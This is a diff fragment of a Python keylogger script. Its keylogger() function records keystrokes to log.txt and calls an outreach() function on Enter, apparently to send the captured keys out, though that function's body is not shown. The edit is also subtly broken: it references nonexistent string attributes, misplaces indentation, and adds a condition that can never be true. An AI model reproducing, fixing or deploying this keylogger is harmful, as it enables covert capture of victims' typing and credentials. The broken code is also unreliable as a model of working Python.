@@ -26,7 +26,7 @@ def outreach():
 
 def keylogger():
 
-
+allchars = string.ascii_lowerclass + string.ascii_upperclass + string.digits
     while True:
         file = open('log.txt', 'a')
 
@@ -41,11 +41,13 @@ def keylogger():
                 
 
             elif event.name == 'enter':
+                char = '\n'
                 outreach()
-
-            print(char)
-            file.write(char)
-            file.close()
+                
+        for i in allchars:
+            if char == i and char == '\n':
+                file.write(char)
+                file.close()
 
 
 
